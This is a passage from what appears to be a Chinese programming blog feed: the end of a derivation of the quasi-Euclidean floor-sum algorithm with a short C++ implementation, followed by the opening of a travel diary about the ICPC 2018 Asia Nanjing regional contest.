&amp; = \left\lfloor \frac{a}{c} \right\rfloor \sum\limits_{i = 0}^{n} {i^2} + \left\lfloor \frac{b}{c} \right\rfloor\sum\limits_{i = 0}^{n} {i} + \sum\limits_{i = 0}^{n} {i \left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor} \\
&amp; = \left\lfloor \frac{a}{c} \right\rfloor \frac{1}{6}n(n + 1)(2n + 1) + \left\lfloor \frac{b}{c} \right\rfloor \frac{1}{2}n(n + 1) + g(a \bmod c, b \bmod c, c, n)
\end{aligned}
\]</span></p>
<p>若 <span class="math inline">\(a, b &lt; c\)</span>，有：</p>
<p><span class="math display">\[
\begin{aligned}
g(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {i \left\lfloor \frac{ai + b}{c} \right\rfloor} \\
&amp; = \sum\limits_{i = 0}^{n} \sum\limits_{j = 0}^{\left\lfloor \frac{ai + b}{c} \right\rfloor - 1} {i} \\
&amp; = \sum_{j = 0}^{\left\lfloor \frac{an + b}{c} \right\rfloor - 1} \sum\limits_{i = 0}^{n} {i \cdot (j \le \left\lfloor \frac{ai + b}{c} \right\rfloor - 1)} \\
&amp; = \sum_{j = 0}^{\left\lfloor \frac{an + b}{c} \right\rfloor - 1} \sum\limits_{i = 0}^{n} {i \cdot (j &lt; \left\lfloor \frac{ai + b}{c} \right\rfloor)}
&amp; \text{let } m = \left\lfloor \frac{an + b}{c} \right\rfloor \\
&amp; = \sum_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {i \cdot (j &lt; \left\lfloor \frac{ai + b}{c} \right\rfloor)} \\
&amp; = \sum_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {i \cdot \left[ cj &lt; (ai + b) - c + 1 \right]} \\
&amp; = \sum_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {i \cdot (i &gt; \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor)}
\end{aligned}
\]</span></p>
<p>不难发现，<span class="math inline">\(\sum\limits_{i = 0}^{n} {i \cdot (\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor &lt; i)}\)</span> 可看作一个首项为 <span class="math inline">\(\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor + 1\)</span>，末项为 <span class="math inline">\(n\)</span> 的等差数列求和，即等于 <span class="math inline">\(\frac{1}{2} \cdot(\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor + 1 + n) \cdot (n - \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor)\)</span>。故有：</p>
<p><span class="math display">\[
\begin{aligned}
g(a, b, c, n) &amp; = \sum\limits_{j = 0}^{m - 1} {\frac{1}{2} (\left\lfloor
\frac{cj + c - b - 1}{a} \right\rfloor + n + 1) \cdot (n - \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor)} \\
&amp; = \frac{1}{2} \sum\limits_{j = 0}^{m - 1} {\left[ n(n + 1) - {\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor}^2 - \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor \right]} \\
&amp; = \frac{1}{2} \left[ \sum\limits_{j = 0}^{m - 1} {n(n + 1)} - \sum\limits_{j = 0}^{m - 1} {\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor}^2 - \sum\limits_{j = 0}^{m - 1} {\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor} \right] \\
&amp; = \frac{1}{2} \left[ mn(n + 1) - h(c, c - b - 1, a, m - 1) - f(c, c - b - 1, a, m - 1) \right]
\end{aligned}
\]</span></p>
<p>看来 <span class="math inline">\(g\)</span> 式最后推出来还会跟 <span class="math inline">\(h\)</span> 式有关系……</p>
</div>
<div id="结论-1" class="section level2">
<h2>结论</h2>
<p>令 <span class="math inline">\(m = \left\lfloor \frac{an + b}{c} \right\rfloor\)</span>，有：</p>
<p><span class="math display">\[
g(a, b, c, n) =
\begin{cases}
\left\lfloor \frac{a}{c} \right\rfloor \frac{1}{6}n(n + 1)(2n + 1) + \left\lfloor \frac{b}{c} \right\rfloor \frac{1}{2}n(n + 1) &amp; \\
 + g(a \bmod c, b \bmod c, c, n) &amp; a \ge c \lor b \ge c \\
\frac{1}{2} \left[ mn(n + 1) - h(c, c - b - 1, a, m - 1) - f(c, c - b - 1, a, m - 1) \right] &amp; \text{otherwise}
\end{cases}
\]</span></p>
</div>
</div>
<div id="h-式" class="section level1">
<h1>h 式</h1>
<div id="形式-2" class="section level2">
<h2>形式</h2>
<p><span class="math display">\[
h(a, b, c, n) = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor}^2
\]</span></p>
</div>
<div id="推导-2" class="section level2">
<h2>推导</h2>
<p>若 <span class="math inline">\(a \ge c\)</span> 或 <span class="math inline">\(b \ge c\)</span>，有：</p>
<p><span class="math display">\[
\begin{aligned}
h(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor}^2 \\
&amp; = \sum\limits_{i = 0}^{n} {(\left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor + \left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor)^2} \\
&amp; = \sum\limits_{i = 0}^{n} {(\left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor)^2} + 2 \sum\limits_{i = 0}^{n} (\left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor) \cdot \left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor \\
&amp; + \sum\limits_{i = 0}^{n} {\left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor}^2
\end{aligned}
\]</span></p>
<p>为了方便展示，分开化简这三项：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 0}^{n} &amp; {(\left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor)^2} \\
= &amp; \left\lfloor \frac{a}{c} \right\rfloor^2 \sum\limits_{i = 0}^{n} {i^2} + 2\left\lfloor \frac{a}{c} \right\rfloor \left\lfloor \frac{b}{c} \right\rfloor \sum\limits_{i = 0}^{n} {i} + {\left\lfloor \frac{b}{c} \right\rfloor}^2 \sum\limits_{i = 0}^{n} {1} \\
= &amp; \left\lfloor \frac{a}{c} \right\rfloor^2 \frac{1}{6}n(n + 1)(2n + 1) + \left\lfloor \frac{a}{c} \right\rfloor \left\lfloor \frac{b}{c} \right\rfloor 2n(n + 1) + \left\lfloor \frac{b}{c} \right\rfloor^2 (n + 1) \\
\\
2\sum\limits_{i = 0}^{n} &amp; {(\left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor)} \left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor \\
= &amp; 2\left\lfloor \frac{a}{c} \right\rfloor \sum\limits_{i = 0}^{n} {i\left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor} + 2\left\lfloor \frac{b}{c} \right\rfloor \sum\limits_{i = 0}^{n} {\left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor} \\
= &amp; 2\left\lfloor \frac{a}{c} \right\rfloor g(a \bmod c, b \bmod c, c, n) + 2\left\lfloor \frac{b}{c} \right\rfloor f(a \bmod c, b \bmod c, c, n) \\
\\
\sum\limits_{i = 0}^{n} &amp; {\left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor}^2 \\
= &amp; h(a \bmod c, b \bmod c, c, n)
\end{aligned}
\]</span></p>
<p>加起来并整理后有：</p>
<p><span class="math display">\[
\begin{aligned}
h &amp; (a, b, c, n) \\
&amp; =  \left\lfloor \frac{a}{c} \right\rfloor^2 \frac{1}{6}n(n + 1)(2n + 1) + \left\lfloor \frac{a}{c} \right\rfloor \left\lfloor \frac{b}{c} \right\rfloor 2n(n + 1) + \left\lfloor \frac{b}{c} \right\rfloor^2 (n + 1) \\
&amp; + 2\left\lfloor \frac{a}{c} \right\rfloor g(a \bmod c, b \bmod c, c, n) + 2\left\lfloor \frac{b}{c} \right\rfloor f(a \bmod c, b \bmod c, c, n) \\
&amp; + h(a \bmod c, b \bmod c, c, n)
\end{aligned}
\]</span></p>
<p>若 <span class="math inline">\(a, b &lt; c\)</span>，有：</p>
<p><span class="math display">\[
\begin{aligned}
h(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor}^2 \\
&amp; = \sum\limits_{i = 0}^{n} (2 \sum\limits_{j= 0}^{\left\lfloor \frac{ai + b}{c} \right\rfloor - 1} {j} + \left\lfloor \frac{ai + b}{c} \right\rfloor) \\
&amp; = 2\sum\limits_{j = 0}^{\left\lfloor \frac{an + b}{c} \right\rfloor - 1} \sum\limits_{i = 0}^{n} {j \cdot (j \le \left\lfloor \frac{ai + b}{c} \right\rfloor - 1)} + \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor} \\
&amp; = 2\sum\limits_{j = 0}^{\left\lfloor \frac{an + b}{c} \right\rfloor - 1} \sum\limits_{i = 0}^{n} {j \cdot (j &lt; \left\lfloor \frac{ai + b}{c} \right\rfloor)} + f(a, b, c, n) \\
&amp; \text{let } m = \left\lfloor \frac{an + b}{c} \right\rfloor \\
&amp; = 2\sum\limits_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {j \cdot (j &lt; \left\lfloor \frac{ai + b}{c} \right\rfloor)} + f(a, b, c, n) \\
&amp; = 2\sum\limits_{j = 0}^{m - 1} j \cdot \sum\limits_{i = 0}^{n} {\left[ cj &lt; (ai + b) - c + 1 \right]} + f(a, b, c, n) \\
&amp; = 2\sum\limits_{j = 0}^{m - 1} j \cdot \sum\limits_{i = 0}^{n} {(\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor &lt; i)} + f(a, b, c, n) \\
&amp; = 2\sum\limits_{j = 0}^{m - 1} j \cdot (n - \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor) + f(a, b, c, n) \\
&amp; = 2n\sum\limits_{j = 0}^{m - 1} {j} - 2\sum\limits_{j = 0}^{m - 1} {j \cdot \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor} + f(a, b, c, n) \\
&amp; = 2n \cdot \frac{1}{2}(m - 1)m - 2g(c, c - b - 1, a, m - 1) + f(a, b, c, n)
\end{aligned}
\]</span></p>
<p>带入之前推 <span class="math inline">\(f\)</span> 式得到的结论可得：</p>
<p><span class="math display">\[
\begin{aligned}
h(a, b, c, n) &amp; = n(m - 1)m - 2g(c, c - b - 1, a, m - 1) \\
&amp; + nm - f(c, c - b - 1, a, m - 1) \\
&amp; = nm^2 - 2g(c, c - b - 1, a, m - 1) - f(c, c - b - 1, a, m - 1)
\end{aligned}
\]</span></p>
</div>
<div id="结论-2" class="section level2">
<h2>结论</h2>
<p>令 <span class="math inline">\(m = \left\lfloor \frac{an + b}{c} \right\rfloor\)</span>，有：</p>
<p><span class="math display">\[
h(a, b, c, n) =
\begin{cases}
\left\lfloor \frac{a}{c} \right\rfloor^2 \frac{1}{6}n(n + 1)(2n + 1) + \left\lfloor \frac{a}{c} \right\rfloor \left\lfloor \frac{b}{c} \right\rfloor 2n(n + 1) + \left\lfloor \frac{b}{c} \right\rfloor^2(n + 1) &amp; \\
\ + 2\left\lfloor \frac{a}{c} \right\rfloor g(a \bmod c, b \bmod c, c, n) + 2\left\lfloor \frac{b}{c} \right\rfloor f(a \bmod c, b \bmod c, c, n) &amp; \\
\ + h(a \bmod c, b \bmod c, c, n) &amp; a \ge c \lor b \ge c \\
nm^2 - 2g(c, c - b - 1, a, m - 1) - f(c, c - b - 1, a, m - 1) &amp; \text{otherwise}
\end{cases}
\]</span></p>
</div>
</div>
<div id="代码实现" class="section level1">
<h1>代码实现</h1>
<div id="仅-f-式" class="section level2">
<h2>仅 f 式</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb1-1"><a href="#cb1-1"></a><span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> quasiEuclidean(<span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> a, <span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> b, </span>
<span id="cb1-2"><a href="#cb1-2"></a>                            <span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> c, <span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> n) {</span>
<span id="cb1-3"><a href="#cb1-3"></a>    <span class="cf">if</span> (a == <span class="dv">0</span>) {</span>
<span id="cb1-4"><a href="#cb1-4"></a>        <span class="cf">return</span> (n + <span class="dv">1</span>) * (b / c);</span>
<span id="cb1-5"><a href="#cb1-5"></a>    }</span>
<span id="cb1-6"><a href="#cb1-6"></a></span>
<span id="cb1-7"><a href="#cb1-7"></a>    <span class="cf">if</span> (a &gt;= c || b &gt;= c) {</span>
<span id="cb1-8"><a href="#cb1-8"></a>        <span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> tmp = (n &amp; <span class="dv">1</span>) ? ((n + <span class="dv">1</span>) &gt;&gt; <span class="dv">1</span>) * n : (n &gt;&gt; <span class="dv">1</span>) * (n + <span class="dv">1</span>);</span>
<span id="cb1-9"><a href="#cb1-9"></a>        <span class="cf">return</span> (a / c) * tmp + (b / c) * (n + <span class="dv">1</span>) + quasiEuclidean(a % c, b % c, c, n);</span>
<span id="cb1-10"><a href="#cb1-10"></a>    }</span>
<span id="cb1-11"><a href="#cb1-11"></a></span>
<span id="cb1-12"><a href="#cb1-12"></a>    <span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> m = (a * n + b) / c;</span>
<span id="cb1-13"><a href="#cb1-13"></a>    <span class="cf">return</span> n * m - quasiEuclidean(c, c - b - <span class="dv">1</span>, a, m - <span class="dv">1</span>);</span>
<span id="cb1-14"><a href="#cb1-14"></a>}</span></code></pre></div>
</div>
<div id="f-g-h-式" class="section level2">
<h2>f, g, h 式</h2>
<p>由于没有找到相应的模板题，所以…… 咕咕咕……</p>
</div>
</div>
<div id="更通用的情况" class="section level1">
<h1>更通用的情况</h1>
<p>在讨论完 <span class="math inline">\(f, g, h\)</span> 式的推导后，我们来看一种更加通用的情况：</p>
<p><span class="math display">\[
\sum\limits_{i = 0}^{n} {i^{k_1} \left\lfloor \frac{ai + b}{c} \right\rfloor ^{k_2}}
\]</span>
题目链接：<a href="https://loj.ac/problem/138">类欧几里得算法 - 题目 - LibreOJ</a></p>
<p>咕咕咕……</p>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>Bill Yang - <a href="https://blog.bill.moe/bsoj4936-euclidean/">「bsoj4936」「模板题」类欧几里得 - 类欧几里得 附简要学习笔记</a></li>
<li>WerKeyTom_FTD - <a href="https://blog.csdn.net/werkeytom_ftd/article/details/53812718">类欧几里得算法小结</a></li>
<li>Cold_Chair - <a href="https://blog.csdn.net/Cold_Chair/article/details/78857161">类欧几里得算法乱搞记</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>ICPC 2018 亚洲区域赛南京站游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/10/icpc-2018-asia-nanjing-regional-travel-notes/</link>
			<pubDate>Tue, 16 Oct 2018 22:50:35 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/10/icpc-2018-asia-nanjing-regional-travel-notes/</guid>
			<description>Day 0 国庆六场模拟赛场场自闭，导致比赛前一周状态不佳。抱着打铁的心态随便整理了一下模板。本来打算当天就整理好并打出来的结果转念一想去南航找复印</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>国庆六场模拟赛场场自闭，导致比赛前一周状态不佳。抱着打铁的心态随便整理了一下模板。本来打算当天就整理好并打出来的结果转念一想去南航找复印店应该很容易（好一个 FLAG）所以就咕咕咕了。晚上听 BinGoo0o0o 巨佬讲了一些很高深的树形背包问题的变形（貌似并没有太听懂 QAQ），然后和队友胡乱吹了一波水，就心安理得地滚回宿舍睡觉了。</p>
<h1 id="day-1">Day 1</h1>
<p>早上起不来啊…… 好困啊…… 结果头天都说要咕咕咕的队友来得都比我早。</p>
<p>高铁好评。尝试在高铁上用 Surface 最后 rush 一下模板，结果前面那个人突然把作为猛地往前一调我 Surface 就不见了…… 还好没悲剧。于是接下来我都没敢用电脑了，就看了一会儿小说。南航离火车站之隔一站地铁…… 然而我感觉在地铁站里面走花的时间比坐地铁还久。</p>
<p>一出地铁就看到南航方向飞来一架直升机…… 然后又来一架…… 然后又是一架…… 果然南航，好强啊。进学校看横幅才知道貌似刚好赶上了一个 “南航 · 昌飞” 直升机主题招聘日，并且打出了 “您的专机已就位！AC311 乘机体验，让我们带你一起飞” 的标语。虽然很想坐直升机，但转念一想身边两位队友就已经可以带我飞了，所以也没什么关系了。照片不出意外地拍残了：</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/helicopter_event.jpg" alt="您的专机已就位! AC311 乘机体验，让我们带你一起飞"></p>
<p>一群人迷路若干次绕了一大圈才找到体育馆。报道时发现南航慷慨地给了三张 20 元的餐券。去南航的网红食堂 “航空餐厅” 吃了午饭…… 拿了一堆菜以为要超额度结果离额度差不少（后悔 QAQ）。反正南航的伙食我吹爆，又便宜又好吃，有这食堂还订什么外卖……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/nuaa_cafeteria.jpg" alt="航空餐厅我吹爆"></p>
<hr>
<p>吃完饭后去体育馆就可以碰到电脑了。南航的体育馆好气派啊……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/nuaa_gymnasium.jpg" alt="体育馆"></p>
<p>到现场发现高中大佬学长就坐在对面的位置 orzzzzz。看比赛手册以为是带 Unity 桌面环境的 Ubuntu 16.04 LTS，结果到手发现是 xfce 桌面环境的 Xubuntu，连 gedit 都没有。另外我们发现电脑巨卡 QAQ。Hanano 尝试在 Code::Blocks 里瞎写一些东西，然后发现有一定几率写一半电脑突然卡住，过几秒才好 QAQ。接着我们又发现，Code::Blocks 执行编译好程序的默认终端是 xterm，而 xterm 连复制粘贴都不行。我们尝试把其改成 xfce-terminal, 结果发现一改在 Code::Blocks 里保存代码的时候就会跳 Exception，然后一点 stop 就闪退…… 心态崩了 QAQ。</p>
<p>下午简短的开幕式完了后就开始了热身赛，还没有打印模板的我心里慌慌的。热身赛一开始，打开 PC^2，输入账号，输入密码，Invalid Password。再输一遍，Invalid Password。两个队友轮流输，Invalid Password。结果后面才知道主办方 PC^2 出锅了…… 那就看题吧。结果拿到题册一看，全都没有时限/空间限制？PC^2 上也没写，这可还行。Hanano 大佬一眼秒 B 题（分别按照 $x, y, z$ 排序并将相邻点间连边建图再在图上跑最小生成树即可）。Hanano 写完 B 题正感叹交不了题的时候，主办方突然表示解决掉 PC^2 的锅了：将每个账户的密码重置为跟账户名一样。可还行。刚交完 B 题，我们发现 PC^2 里看不到评测队列并且半天没等到结果，我就提议看看榜单。结果一开 Firefox，整个电脑就卡死了…… 我们等了十分钟后发现电脑还没反应就召唤来了现场志愿者小姐姐，接着志愿者小姐姐又召唤来了志愿者小哥哥，帮我们进行了强制重启大法，解决了这一问题。我背锅我背锅，再也不敢看榜单了呜呜呜。直到小姐姐送来了气球我们才知道 B 题过了，Hanano 好强啊 QAQ。</p>
<p>接下来 nbfynbfy 大佬很快也推出了 C 题公式，好强啊 QAQ。电脑恢复正常后 nbfynbfy 写了 C 题，我给 nbfynbfy 提供了预处理阶乘逆元并 $\mathcal{O}(1)$ 求组合数的写法后也 1 发 AC 了。接着在我卡 D 题的时候 Hanano 决定试试环境而本垃圾一眼秒 A 题，然后发现 A 题看漏了一个条件…… 然后就做不来了…… 于是我就去开 D 题了。</p>
<p>在主办方表示除 <code>Desktop</code> 以外其他地方存文件可以保留下来的时候，Hanano 就决定玩玩 <code>vimrc</code> 啦…… 他一顿操作猛如虎写下了自己的 <code>vimrc</code>，却发现无论如何也加载不上去…… 知道我查到可以使用 <code>-u</code> 指令加载自定义配置文件后，他才发现自己 <code>vimrc</code> 写挂了…… 然后搞了半天终于调好了，并保存在了非 <code>Desktop</code> 目录下，然后美滋滋地让我瞎搞 D 题。</p>
<p>我 D 题考虑如果使用类似树状数组的数据结构的话，区间修改是只跟左端点和右端点 $+ 1$ 有关的，因此可以考虑首先读入询问并离散化所有左端点和右端点 $+ 1$ 来把 $10^9$ 的神仙数据范围降到 $10^5$。然而写了一半才意识到区间修改实现有一处细节考虑错了…… 然后就凉了做不来了。一道题都没做，划了三小时水，好羞愧呜呜呜。</p>
<p>赛后群里 Claris 表示我只看了 A 和 D 不都是 BZOJ 原题吗…… 瑟瑟发抖（分别是 BZOJ 2345 和 BZOJ 1938）。A 题面出锅了…… 原题是 V 船可以随意乱走但是热身赛题面说的是 V 船必须与 Y 船按照同样的方式走…… 醉了啊。要是是前者题意的话就是一道大水题。听说主办方为 A 题准备了 $300$ 多个气球最后只发出了不到 $10$ 个，哈哈哈。而至于 D​ 题，大致是先要用一些数学变换把修改操作转化为可以用树状数组或是线段树维护的修改操作，再像我那样离散化区间端点…… 嘤嘤嘤我开了什么神仙题啊，不过有空还是想补补这道题……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/warm_up.jpg" alt="热身赛现场"></p>
<hr>
<p>Hanano 表示 NUAA 的餐券好好看啊想留一张。我觉得大佬说的很有道理，于是我们去吃了汉堡王…… 然而吃的有些慢，一不小心就把学长咕了，呜呜呜。晚上路过南航停机坪时顺便偷拍了一架直升机……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/helicopter.jpg" alt="黑夜中的直升机"></p>
<p>去了宾馆，终于不是一晚上 $30$ 元一人的那种了，感觉超棒。在宾馆里最后修改了一下模板就跑回南航里找打印店了（要是没有模板我怕是要被队友打死 QAQ）。南航好大啊 QAQ。找了半天才找到打印店。打印好模板后站在南航里跨公路天桥上看了一会儿车水马龙…… 感觉莫名平静，另外就是感觉我读了一个假大学。</p>
<h1 id="day-2">Day 2</h1>
<p>房间里开了二十度的空调还能有蚊子…… 也是醉了。</p>
<p>七点过爬起来后在酒店吃完早餐就上路了。回到体育馆一看，什么都没了（包括前一天调了半天写好的 <code>vimrc</code>），于是 Hanano 一气之下就决定用 Code::Blocks 了。不过还好，今天电脑基本不卡了，而且修改默认终端也不会报错了。</p>
<p>本来以为有倒计时的（连热身赛都有倒计时），结果比赛突然说开始就开始了。题册按照惯例也没有时间限制空间限制，主办方在 PC^2 里发了个 Clarification 才把时限告知参赛选手…… 不过貌似还是没有空间限制。前一天听学长说貌似 PC^2 不会返回 Memory Limit Exceeded，所以貌似可以放心大胆瞎搞？问题不大。</p>
<p>按照惯例，nbfynbfy 从头看， Hanano 从中间看（F 题信仰），我从后往前看。我一看最后一题，回文树？打扰了。此时 nbfynbfy 貌似一眼秒了 A 题并开始敲代码了。他火速敲完后说是一个裸 Nim 博弈，我简单晃了一眼题貌似是的就让他交了…… 然后 Wrong Answer。然后我脑抽地问了一句会不会是多组数据…… 然后又交…… 又一发 Wrong Answer。于是我又仔细读了一遍题，发现看掉一个条件…… 一次取石头只能取一段连续区间。给 nbfynbfy 说了后心态有点小崩，然后就留下他继续想 A 我先去看 B 题了（我博弈很菜的 QAQ）。看完 B 题后发现没什么思路，这个时候看了一眼榜发现怎么大家都会 A 题啊 QAQ，然后 J 题也有人过，于是我就又去看了看 J 题，发现没有什么思路，只知道质因数肯定是要分解的，于是本垃圾心态更崩了。这个时候 Hanano 拉着我一起想 C 题。简单想了想没什么思路，我就决定先去跟 nbfynbfy 搞 A 题了（此时已经过了一片了）。然而这个时候志愿者小姐姐突然送给我们一只红色气球。Hanano 问道是 A 题过了吗？我懵逼了，难道重测了？再三看了看 PC^2 里的评测结果和榜单确认我们还依然处于签到失败的状态…… orz 看起来是气球发错了 QAQ。nbfynbfy 问我 $k + 3$ 是不是必败态，我仔细想了想发现不是…… 然后我们很快发现先手必胜的情况好多啊…… 会不会一定是必胜呢？简单想了想发现只要先手一来从中间取一段使得剩下两段长度相同的连续区间，然后接下来对方怎么取就跟着怎么取就一定必胜了…… 不过还要特判一下 $k = 1$ 的情况，因为 $k = 1$ 且 $n$ 为偶数时先手无法搞出长度相同的两段连续区间。于是我瞎写了几行交上去终于 Accepted 了。签到花了四十分钟嘤嘤嘤，而且一来就两百多名，充满了打铁气息。</p>
<p>接下来我们赶忙去看 J 题。nbfynbfy 提出了一种复杂度 $\mathcal{O}(n\log{n})$ 的神仙做法但是给我和 Hanano 讲的时候我们都一时没有理解（nbfynbfy！），于是就让 nbfynbfy 将就 Hanano 写好的素数筛和质因数分解直接上了。nbfynbfy 一顿操作猛如虎便过了样例，然后交上去后 PC^2 表示 Time Limit Exceeded。于是我们一起看了看代码，我首先发现 Hanano 写的是 $\mathcal{O}(n\log^2{n})$ 的埃氏筛，于是要求改成线性筛再交一发…… 继续 Time Limit Exceeded。我心态有些小崩，明明都总算 $\mathcal{O}(n\log{n})$ 了怎么还不让过 QAQ。我把目光转向了质因数分解部分，发现 Hanano 写的是 $\mathcal{O}(\frac{n}{\log{n}})$ 的质因数分解（即试除终止条件为 <code>primes[j] &lt;= n</code>），这勾起了我 Codeforces 上某场疯狂 TLE 一小时的惨痛回忆，于是顺手改成了 $\mathcal{O}(\frac{\sqrt{n}}{\log{\sqrt{n}}})$ 的质因数分解（即试除终止条件为 <code>primes[j] * primes[j] &lt;= n</code>），这样一来预处理素数的范围也可以改小一点了，然后再交一发…… 竟然 Accepted！开心（这算卡常吗 QAQ……）~</p>
<p>我们看了一眼榜，发现 I 题过的人挺多的（另外就是发现自己还在铁牌区 QAQ），于是我就去看 I 题了。我题还没读完 nbfynbfy 就大叫一声二分图（好强啊 QAQ），我一看有道理不过这个直接二分图匹配不好做要用网络流。与 Hanano 讨论了建图后发现自己之前把一个人拆成两个点的建法存在 TLE 风险…… 于是自己就考虑直接超级源点到源点容量限成 $n + k$，然后源点到每个人边容量设成 $2$ 来建。于是我上去写这道题，Hanano 和 nbfynbfy 一起去看 G 题了。我敲了半天 Dinic 板子并写好后样例一遍过，然而提交却 Wrong Answer 了。我的第一反应是会不会模板抄错了，检查了半天也没发现问题。这个时候 Hanano 过来帮我看了一看表示我建图存在漏洞…… 不应该只设一个源点限制 $n + k$，应当建两个源点一个限制 $n$ 一个限制 $k$，因为前者可能导致实际上有多于 $k$ 人服药。我一想好有道理啊，然后改了改交上去就 Accepted 了。贡献了一发罚时好羞愧 QAQ，Hanano 好强啊。</p>
<p>接下来我们就一起去看 G 了，Hanano 和 nbfynbfy 貌似已经人肉打表并发现一个公式了（疯狂膜队友），Hanano 用电脑上的 Python 进行了简要验算后就开始尝试化简式子了，然而化简了好久貌似都有一些问题（in the meantime 本垃圾由于什么都不会就只好帮大佬队友做人肉验算）。最后 nbfynbfy 进行一顿化简后大叫，这不就是组合数 $\binom{n + 3}{4}$ 吗…… 我们验算了 $n = 1 \sim 5$ 发现全都是对的，然后 Hanano 就说不如偷个懒直接用 Python 随手写一个交一发试试看（直接用内置高精度就懒得算逆元了）。在等待 PC^2 返回结果时 Hanano 表示要是 TLE 了就好玩了…… 然后若干秒后真的 Time Limit Exceeded 了。一口好奶，真是笑死在现场。于是我们只好灰溜溜地又用 C++ 写…… 然后就 Accepted 了。队友太强了 ooorrrz！</p>
<p>此时我们过了四题，大概位于铜牌区。不过这时大概就差不多要封榜了。我们看 D 题和 K 题过的人比较多，就决定最后一个小时主要看这两道题。D 题我看完题目就有二分答案的想法，不过如何判断答案是一个问题 —— 以给定所有点为球心作半径为 $R$ 的球并判断这些球是否相交于同一区域。开始我以为只要这些球两两相交就可以了，但是 Hanano 写出来后发现第二个样例没过，在纸上画了画才意识到这样子是不行的。然后 Hanano 就感叹道有没有最小球覆盖的算法啊…… 此时 nbfynbfy 掏出了他携带的一大堆书，并在红书上真的翻到了最小球覆盖问题的模板，好强啊 QAQ。比赛前还一直跟他说带这么多书没什么卵用的我此刻也只能说真香了。Hanano 表示这个模板码风好辣鸡啊然后二话不说开始打模板。于是我和 nbfynbfy 就一起去看 K 题了。</p>
<p>在此期间发生了几件有趣的事情…… 突然我们的 PC^2 都被登出了，不久后主持人表示评测姬出了一些问题正在修锅。几分钟后主持人表示评测姬好了并且比赛会延长 $5$ 分钟。接下来，主持人幽幽地来了一句，大家不要提交大文件，刚刚就是有个队提交了一个一百多兆的打表代码把评测姬卡爆了…… 现场一片大笑哈哈哈哈哈。可是没过多久后我们的 PC^2 却又被登出了，主持人再次表示正在修锅，几分钟后主持人又表示比赛再延长 $5$ 分钟，也就是总共延长 $10$ 分钟。这次主持人没有表示出锅原因，赛后我才听说好像是某个队伍疯狂提交 <code>rand</code> 导致评测姬负荷量过大卡掉了。</p>
